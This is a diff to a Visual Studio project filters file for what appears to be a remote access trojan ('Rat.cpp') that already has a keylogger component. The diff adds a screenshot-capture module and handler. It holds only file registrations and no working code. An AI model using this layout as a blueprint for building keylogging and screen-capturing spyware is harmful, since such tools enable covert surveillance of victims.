@@ -20,6 +20,9 @@
     <Filter Include="KeyLogger">
       <UniqueIdentifier>{b705dcd1-ef61-4fb6-8795-2b4a4cf4e08a}</UniqueIdentifier>
     </Filter>
+    <Filter Include="Screenshot">
+      <UniqueIdentifier>{3037227e-c655-441e-aa7e-344da1e1597f}</UniqueIdentifier>
+    </Filter>
   </ItemGroup>
   <ItemGroup>
     <ClInclude Include="IMessageHandler.h">
@@ -61,6 +64,13 @@
     <ClInclude Include="PressedKey.h">
       <Filter>KeyLogger</Filter>
     </ClInclude>
+    <ClInclude Include="Screenshot.h">
+      <Filter>Screenshot</Filter>
+    </ClInclude>
+    <ClInclude Include="TakeScreenshotHandler.h">
+      <Filter>Handlers</Filter>
+    </ClInclude>
+    <ClInclude Include="GdiPlusInitializer.h" />
   </ItemGroup>
   <ItemGroup>
     <ClCompile Include="Rat.cpp">
@@ -99,6 +109,13 @@
     <ClCompile Include="PressedKey.cpp">
       <Filter>KeyLogger</Filter>
     </ClCompile>
+    <ClCompile Include="Screenshot.cpp">
+      <Filter>Screenshot</Filter>
+    </ClCompile>
+    <ClCompile Include="TakeScreenshotHandler.cpp">
+      <Filter>Handlers</Filter>
+    </ClCompile>
+    <ClCompile Include="GdiPlusInitializer.cpp" />
   </ItemGroup>
   <ItemGroup>
     <None Include="packages.config" />
